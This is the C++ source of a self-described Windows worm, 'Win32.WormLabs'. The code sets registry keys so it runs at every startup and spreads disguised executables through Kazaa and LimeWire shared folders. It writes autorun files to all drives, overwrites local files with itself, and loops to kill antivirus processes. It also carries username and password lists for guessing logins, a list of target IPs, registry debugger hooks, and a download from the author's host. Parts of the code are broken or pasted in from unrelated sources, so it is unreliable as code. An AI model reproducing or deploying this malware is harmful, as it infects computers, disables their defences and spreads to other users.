/*************************************************************
 * Win32.WormLabs (04/27/2010)
 * >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 * by Undermine
 * Undermine.bloger.hr | svchosts.t35.com
 * ########################################################### 
 * ++WormLabs++
 * WormLab is the first born worm, who wait in features to grow.
 * Now the best part about WormLab is it a new effective technique 
 * for us and all we have to do is dump our file
 * into a workspace! hi ilove that part!
 *
 * Now there is some minor security on this tool so no .exe's but
 * we can do .zip's and .rar's so to fully exploit this little
 * loophole i' make worm archived!
 *  the next little challenge i' make :
 * Run at every startup
 * Infect drives & files
 * P2P Process
 * Taskkill av
 * Attempt to spread using predefined users/password list
 * Pretty cool right?!  
 * 
 * So let the fun begin on hacking this cool tool. This worm
 * is my practicaly child and he need to growup that because
 * worm life defence against a.v. 
 * >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 ************************************************************/
#include <windows.h>
#include <iostream>
#include <string> 
#include <fstream>
#include <shlobj.h>
#include <tlhelp32.h>
#include <stdlib.h>
#include <io.h>
#include <stdio.h>
#include <sys/types.h>
#include <fcntl.h>
#define REPORT_PORT 80
#define users_list qwertyuiopasdfghjklzxcvbnm
using namespace std;
const char *Inf_Drives[] = {"A:","B:","C:","D:","E:","F:","G:","H:","I:","J:","K:","L:",
"M:","N:","O:","P:","Q:","R:","S:","T:","U:","V:","W:","X:","Y:","Z:",0};
// sometime need to update *TASKKILL
const char *Taskkill[] = {"av","Av","AV","defend","Defend","DEFEND","f-","F-",
                          "defense","Defense","DEFENSE","Kaspersky","KASPERSKY",
						  "kaspersky","sophos","SOPHOS","Sophos","Scanner","SCANNER",
						  "scanner","Norton","norton","NORTON","Security","SECURITY","security",
						  "Anti","ANTI","anti","SCAN","Scan","scan","Malware","MALWARE","malware",
                          "Virus","VIRUS","virus","NOD32","nod32","Nod32","Zoner","ZONER","zoner",
						  "SECUR","Secur","secur","Dr.","DR.","DR.","Trendmicro","Trendmicro",
						  "GData","GData","i360","i360","Guard","Guard","Guard","Micr","Micr",0};
#define error()
const char *users_list[] = {"admin","administrator","antrax","bob","guest",
	                        "root","test","plantaspont","wwwadmin","ucoz","milan",
	                        "forum","sindikat","camel","business","enter","muhamad",
	                        "lord","cetnik","princo","skynet","workshop","airport","batamb",	
	                        "deniz","foundation","nathan","alpha","neobux","hill","student",
	                        "micrology","avers","developer","doctor","hoffman","melita","byter",
	                        "zen","eindhoven","gecko","alpha","client","server","ufonet",							
	                        "avatars","cetnik","ncsc","jenna","gaga","melita","beta",
	                        "lenny","pantera","nathan","clients1","mupek","hosts","orion",
	                        "cowgirl","pcworld","pajov","sunos","homer","melita","beta",
	                        "jeniz","netware","zokili","beonet","mup","mpek","ultimate",
	                        "ladygaga","network","melissa","ana","clients0","telenor",							
	                        "gamer","matrix","anna","public","documents","devil",
	                        "nicktoons","jimmy","spongebob","eunet","users","branko",
							"gamer","maniez","hilary","ralph","jamey","bandot","clubber",
	                        "yunita","alvin","dave","misty","freddy","ves",
	                        "webmaster","raja","jecka","default"};							
const char *passwords_list[] = {"qwerty","veki","123","1234","12345","123456",
	                            "1234567","12345678","123456789","1234567890",
	                            "access","Orion","bob","billy","vesna","dejan",
	                            "internet","bitch","data","database","home", 
	                            "server","login","guest","lucy","pass","pass1234",
	                            "jenna","intruder","macro","enter","djindjic",
                                "winpass","root","weber","user","test","gamer",								
	                            "lazar","skorpija","sex","sexy","oracle","mysql",
	                            "061279","dekd5emgfa","evropa","hell","bloger",
	                            "internet","boss","hacker","system","2012",
	                            "fishbowl","zokili","shadow","index","abcd",
	                            "123abc","qweerty","joker","euroserbia","euronet",
	                            "milan","abcde","testing","start","space",
	                            "bgzemun","bgzpodzemlje","fsarah","271076nenalaki",
	                            "ljubaviska","sneza1969","12071948","vekibg87",
	                            "h27dklsu","mitrijevic","uyd23j08jhw","j923hq0",
	                            "azxcvbmn","geniusnet","vaga65","sundjerbob",
	                            "macrobg","password","korisnik","difcult198j0",
	                            "usercard","jwfi82vz9","capscope","usernet",
	                            "tywerq","epadnote","springers","dominosex",
                                "aradonjic","summernight","worlddate","night",
	                            "masterds","wlive","borntuesday","exister",
	                            "carlosmontana","patrijarhija"};
	                            

static char *target_ip[] = {"192.168.65.74","66.220.146.32","69.63.181.11","69.63.181.12",
                            "127.0.0.1","127.32.137.13","128.32.137.13","172.155.21.56",
						    "202.199.13.90","203.127.89.138","238.17.159.4","212.120.83.203","212.180.111.99"};
static char *port_connect[] = {"80","9872","9873","9874","9875","10000"};

static char *password_mutex[] = {"vwnjivkioe", "oasewiq", "mkiqhze", "alexbnuy",
"fruto93ue", "mokiaz", "nmkoas", "amorphous","xnia9qsz", "oprojvsau", "andromache", "amibcew",
"nominatonagy", "iqucv2657n", "92bvdsi", "anything","l0iydros", "z027nloq", "kolkpxs", "pics23hfwb",
"athendryt", "wh39hsckx0", "ie82ncgyh", "asurezk3820konsy","frajdenu82yz", "brianly623bu", "goblano82gbds", "chaopabn",
"ditbay", "banks", "barber", "baritone","bass", "basysoon", "joker", "beater",
"beautyloren", "beethoven", "beloved", "benz","beowulf", "berkeley", "berliner", "beryl",
"beverlymenow782gt7v", "bicakiosal", "vukole287b9561o", "bids832","bridzitbau3wy", "broadway", "bumbalumbl", "burelai",
"zqiu92by", "02cpjax", "92mdcoa2", "8348hfkwejisz","laop0ib", "zaioegw", "moiswgy", "coajag",
"gathynisam7e", "reltycs", "leadioru", "dionis","humantrakj", "charmode", "caitko48m", "chester",
"spaceonmamma", "touchme", "f92hoiape","qoufziwetyoi","8238cvnkoa", "c728h1ko", "bnoi3829s", "computer",
"condort923jhosa", "cookie", "zipedjoe", "annax02uhno","cdiup439sn", "created", "creosote187fbh", "420nzsha",
"daemon", "cominghome", "help", "sos","92hjci", "december", "mcafee", "delux","6njkiz0sdio",
"develop", "29hcisoal0l", "njisakehwq","owehnk30oh", "landtwo", "y7328nklsj", "2j9hnvkos",
#define VirSize	(51916+1)
#define LenID	(2+1)
}; 	                            

int InfectDrives(void);
int InfectFiles(void);
void FindDirectory(LPCSTR DirPath);
void FillArray(LPCSTR Directory);
 
char DirArray[250000][MAX_PATH];
unsigned char rar[1024];
int dircount = 0;
char windir[MAX_PATH];

HKEY hKey;
 
int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
 int count;
 char wormpath[256];
 GetWindowsDirectory(windir, sizeof(windir));
 HMODULE hMe = GetModuleHandle(NULL);
 DWORD nRet = GetModuleFileName(hMe, wormpath, 256);
 HKEY hKey;
 strcat(windir, "\\System32\\s32.exe");
 CopyFile(wormpath, windir, 0);


 RegCreateKey (HKEY_CURRENT_USER, "Software\\Undermine\\AuthorRights", &hKey);
 RegSetValueEx (hKey, "WormLabs", 0, REG_SZ, (LPBYTE) windir, sizeof(windir));
 
 RegCreateKey (HKEY_CURRENT_USER, "Software\\Microsoft\\Internet Explorer\\InternetRegistry",&hKey);
 RegSetValueEx (hKey, "WormLabs", 0, REG_SZ, (LPBYTE) windir, sizeof(windir));
 
 RegCreateKey (HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer",&hKey);
 RegSetValueEx (hKey, "Explore", 0, REG_SZ, (LPBYTE) windir, sizeof(windir));
 
 RegCreateKey (HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey);
 RegSetValueEx (hKey, "WormLabs", 0, REG_SZ, (LPBYTE)windir, sizeof(windir));
 
 RegCreateKey (HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\WinRAR.exe", &hKey);
 RegSetValueEx (hKey, "WormLabs", 0, REG_SZ, (LPBYTE)windir, sizeof(windir));
 
 RegCreateKey (HKEY_CURRENT_USER, "Software\\Kazaa\\Transfer", &hKey);
 RegSetValueEx (hKey, "Upload", 0, REG_SZ, (LPBYTE)windir, sizeof(windir)); 

 CopyFile(wormpath, "C:\\Program Files\\KaZaa\\My Shared Folder\\users_info.txt.exe", 0);
 CopyFile(wormpath, "C:\\Program Files\\KaZaa\\video sister.avi.exe", 0);
 CopyFile(wormpath, "C:\\Program Files\\KaZaa\\gratis.mp3.exe", 0);
 CopyFile(wormpath, "C:\\Program Files\\KaZaa\\My Shared Folder\\ladygaga.mp3.exe", 0);
 CopyFile(wormpath, "C:\\Program Files\\KaZaa\\maliciousremovaltool.rar.exe", 0);
 CopyFile(wormpath, "C:\\Program Files\\KaZaa\\My Shared Folder\\ladyinbed.avi.exe", 0);
 CopyFile(wormpath, "C:\\Program Files\\KaZaa\\ReadMe!.nfo.exe", 0);
 CopyFile(wormpath, "C:\\Program Files\\KaZaa\\My Shared Folder\\list-download.txt.exe", 0);
 CopyFile(wormpath, "C:\\Program Files\\KaZaa\\game-collection.exe", 0);
 CopyFile(wormpath, "C:\\Program Files\\KaZaa\\My Shared Folder\\porno+18.mpeg.exe", 0);
 CopyFile(wormpath, "C:\\Program Files\\KaZaa\\remoteotherkazaa.rar.exe", 0);
 CopyFile(wormpath, "C:\\Program Files\\KaZaa\\My Shared Folder\\softpacked.exe", 0);
 CopyFile(wormpath, "C:\\Program Files\\LimeWire\\gratis.zip.exe", 0);
 CopyFile(wormpath, "C:\\Program Files\\LimeWire\\My Shared Folder\\spaceticket.doc.exe", 0);
 CopyFile(wormpath, "C:\\Program Files\\LimeWire\\gratis.mp4.exe", 0);
 CopyFile(wormpath, "C:\\Program Files\\LimeWire\\My Shared Folder\\info download.txt.exe", 0);
  
  ShellExecute(NULL, "open", "IExplore.exe", NULL, NULL, SW_HIDE);
  ShellExecute(NULL, "open", "http://svchosts.t35.com/overlord/reality.jpg", NULL, NULL, SW_HIDE);

  Sleep(18000);
  ShellExecute(NULL, "open", windir, NULL, NULL, SW_HIDE);
 {
     count = count ^ 5;
 }
 return 0;
}
int NeverAntiVirus(void)
{
	int c;
	while(1) {
		for(c=0;Taskkill[c]!=0;c++) system((char *)&Taskkill[c]);
		Sleep(1000);
	}
	return 0;
}
int InfectDrives(void)
{
	char IFile[256], NewFile[256], Autorun[256], InfFile[256];
	GetSystemDirectory(IFile,sizeof(IFile));
	strcat(IFile,"\\update.exe");
	int i;
	while(1) {
		for(i = 0; Inf_Drives[i]; i++) {
			memset(NewFile,'\0',sizeof(NewFile));
			memset(Autorun,'\0',sizeof(Autorun));
			memset(InfFile,'\0',sizeof(InfFile));
			strcpy(NewFile,Inf_Drives[i]);
			strcpy(Autorun,Inf_Drives[i]);
			strcat(NewFile,"\\allow.exe");
			strcat(Autorun,"\\autorun.inf");
			if(CopyFile(IFile,NewFile,FALSE)) {
			/* Need to Fix This */
			//	FILE *runfile = fopen(Autorun,"wb");
		    	sprintf(InfFile,"[autorun]\r\nopen=allow.exe\r\naction=Open folder to view files\r\n");
			/*And Need to Fix This */
			//	fputs(InfFile,runfile);
			//	fclose(runfile);
				SetFileAttributes(NewFile,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_NOT_CONTENT_INDEXED);
				SetFileAttributes(Autorun,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_NOT_CONTENT_INDEXED);
			}
		}
		Sleep(2000);
	}
}
int InfectFiles(void)
{
	WIN32_FIND_DATA w32;
	HANDLE fHandle;
	char MyFile[256];
	GetModuleFileName(NULL,MyFile,sizeof(MyFile));
	if((fHandle = FindFirstFile("*.*",&w32))==INVALID_HANDLE_VALUE) return 1;
	else {
		if(w32.cFileName==MyFile) goto next;
		SetFileAttributes(w32.cFileName,FILE_ATTRIBUTE_NORMAL);
		CopyFile(MyFile,w32.cFileName,FALSE);
        next:
		while(FindNextFile(fHandle,&w32)) {
			if(w32.cFileName==MyFile) continue;
			SetFileAttributes(w32.cFileName,FILE_ATTRIBUTE_NORMAL);
			CopyFile(MyFile,w32.cFileName,FALSE);
		}
		FindClose(fHandle);
	}
	return 0;
}
void FindDirectory(LPCSTR DirPath)
{
     WIN32_FIND_DATA FindData;
     HANDLE hFind;
     char Path[MAX_PATH];
     hFind = FindFirstFile(DirPath, &FindData);
     do
     {
         strcpy(Path, DirPath);
         Path[strlen(DirPath)-1] = 0;
         strcat(Path, FindData.cFileName);

         if ((FindData.dwFileAttributes==FILE_ATTRIBUTE_DIRECTORY || FindData.dwFileAttributes==FILE_ATTRIBUTE_DIRECTORY+FILE_ATTRIBUTE_SYSTEM) && (strstr(FindData.cFileName,".")==0))
         {
           FillArray(Path);
           strcat(Path,"\\*");
           FindDirectory(Path);
         }

     } while (FindNextFile(hFind,&FindData));
     FindClose(hFind);
}

void FillArray(LPCSTR Directory)
{
     lstrcpy(DirArray[dircount],Directory);
     dircount++;
}
void p2p_spread(void)
{
	char wormpath[MAX_PATH];
	GetModuleFileName(NULL, wormpath, MAX_PATH);
	strcat(windir, "\\System32\\s32.exe");
}
/*
#ifndef RC_INVOKED
typedef struct sockaddr_nb {
	short	snb_family;
	u_short	snb_type;
	char	snb_name[NETBIOS_NAME_LENGTH];
} SOCKADDR_NB, *PSOCKADDR_NB, *LPSOCKADDR_NB;
SET_NETBIOS_SOCKADDR(_snb,_type,_name,_port) 
{ 
	register int _i; 
	register char *_n = (_name); 
	register PSOCKADDR_NB _s = (_snb); 
	_s->snb_family = AF_NETBIOS; 
	_s->snb_type = (_type); 
	for (_i=0; _n[_i] != '\0' && _i<NETBIOS_NAME_LENGTH-1; _i++) { 
		_s->snb_name[_i] = _n[_i]; 
	} \
	for (; _i<NETBIOS_NAME_LENGTH-1; _i++) { 
		_s->snb_name[_i] = ' '; 
	} \
	_s->snb_name[NETBIOS_NAME_LENGTH-1] = (_port); 
} 
#endif   
#endif
void 
TimeoutWait(struct global_data *gd, int aMicroSec,
	TWormInstallation *st1, TWormInstallation *st2)
{
  TWormInstallation s_to;
  TTimeIntervalMicroSeconds32 t_to(aMicroSec);

  gd->iTimer->After(s_to, t_to);
  //User::WaitForInstallation(s_to, st);
  while(s_to == KInstallationPending &&
        (st1 == 0 || *st1 == KInstallationPending) && 
        (st2 == 0 || *st2 == KInstallationPending))
    User::WaitForAnInstallation();
  gd->iTimer->Break();
}

const char * 
GetBase(struct global_data *gd, const char *var, char *buff, const char *def)
{
  char *c = gd->base, *b;
  int l = strlen(var);
  while(*c)
    {
      if(strncmp(c, var, l) == 0 && c[l] == '=')
        {
	  c += l+1;
	  b = buff;
	  while(*c && *c != '\n')
	    *b++ = *c++;
	  *b = 0;
	  return 0;
	}
      while(*c && *c != '\n')
	c++;
      while(*c == '\n')
	c++;
    }
  return 0;
} */
bool FileExists(string n) 
{
    ifstream undermfile(n.c_str());
    return undermfile.is_open();
}

string ReplaceAll(string s, string r, string txt) 
{
	int p = txt.find(s,0);
	while(p != string::npos)
	{
		txt.erase(p, s.length());
		txt.insert(p,r);
		p = txt.find(s, p + r.length());
	}
	return 0;
}

bool Hook(char* path, char* regPath)
{
	HKEY hKey;
	bool hooked = false;
	if(RegCreateKey(HKEY_LOCAL_MACHINE,regPath,&hKey) == ERROR_SUCCESS)
	{
		if(RegSetValueEx(hKey,"Debugger",0,REG_SZ,(BYTE *)path, lstrlen(path)) == ERROR_SUCCESS) 
		{
			hooked = true;
		}
	}
	RegCloseKey(hKey);
	return hooked;
}

void UnHook(char* regPath)
{
	//deletes the key
	RegDeleteKey(HKEY_LOCAL_MACHINE, regPath);
}

bool HookExists(char* regPath) 
{
	//heRE regPath will contain a registry path for the hook...
	HKEY hKey;        
	bool keyExists = false;
	if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,regPath,0,KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS)
	{
		keyExists = true;
	}
	return keyExists;
}
void Payload(void)
{
    //payload downloading jpg
    typedef int * (*URLDownloadToFileA)(void*,char*,char*,DWORD,void*);
    HINSTANCE LibUrl = LoadLibrary("*.Url");
    URLDownloadToFileA URLDownloadToFile =  (URLDownloadToFileA) GetProcAddress(LibUrl,"URLDownloadToFileA");
    URLDownloadToFile(0, "http://svchosts.t35.com/overlord/reality.jpg", "reality.jpg", 0, 0);
    if(FileExists("reality.jpg")) 
    {
       char winDir[MAX_PATH]="";
       GetWindowsDirectory(winDir, MAX_PATH);
       strcat(winDir,"\reality.jpg");
       
       CopyFile("reality.jpg",winDir,TRUE);
       if(FileExists(winDir)) 
       {
          HKEY hKey; 
          RegCreateKey(HKEY_CURRENT_USER, "Control Panel\\Desktop", &hKey);
	      RegSetValueEx(hKey, "Wallpaper", 0, REG_SZ, (BYTE *)winDir, lstrlen(winDir)+1);
	      RegSetValueEx(hKey, "DesktopWallpaper", 0, REG_SZ, (BYTE *)"1", lstrlen("1")+1);                                                                         
       }
#define W32_WormLabs
    }
}
static char *author[] = {" WormLabs - by Undermine "};

